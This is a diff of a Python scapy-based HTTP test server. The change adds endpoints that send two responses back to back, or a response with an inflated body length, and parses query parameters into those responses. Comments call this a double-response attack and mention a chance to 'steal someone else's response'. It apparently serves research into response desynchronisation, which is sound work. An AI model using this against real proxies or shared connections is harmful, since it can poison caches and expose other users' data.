@@ -33,13 +33,21 @@ def handle_client(host, port, conn):
         except ConnectionResetError:
             break
 
-        path = req["HTTP"].Path.decode()
-        print(f"[{datetime.datetime.now()}]  {host} {port} {path}")
+        query = req["HTTP"].Path.decode()
+        print(f"[{datetime.datetime.now()}]  {host} {port} {query}")
 
-        if path == "/double":
+        path = query.split("?")[0]
+        params = ""
+        if "?" in query:
+            params = query.split("?")[1]
 
-            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / "You've triggered a double-response attack.\n"
-            res2 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / "Hard times have befallen you.\n"
+
+        if path == "/two":
+
+            # Two consecutive responses
+
+            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / f"First={params}\n"
+            res2 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / f"Hard times have befallen you.\n"
 
             try:
                 #scapy_sock.send(bytes(res1) + bytes(res2))
@@ -49,9 +57,21 @@ def handle_client(host, port, conn):
                 scapy_sock.close()
                 break
 
+        elif path == "/double":
+            # Two responses in a single packet (probably)
+
+            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / f"First={params}\n"
+            res2 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / "Hard times have befallen you.\n"
+
+            try:
+                scapy_sock.send(bytes(res1) + bytes(res2))
+            except:
+                scapy_sock.close()
+                break
+
         elif path == "/partial":
 
-            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / "You've triggered a partial response.\n"
+            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / f"Partial={params}.\n"
             res2 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / "This body isn't even transferred.\n"
 
             # Suggest a longer body, in case we can steal someone else's response
@@ -73,7 +93,7 @@ def handle_client(host, port, conn):
 
         elif path == "/":
 
-            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / "OK, here's your content. Try /double or /partial for some more fun.\n"
+            res1 = HTTP() / HTTPResponse(Keep_Alive=KEEPALIVE) / f"Normal={params}\n"
 
             try:
                 scapy_sock.send(bytes(res1))
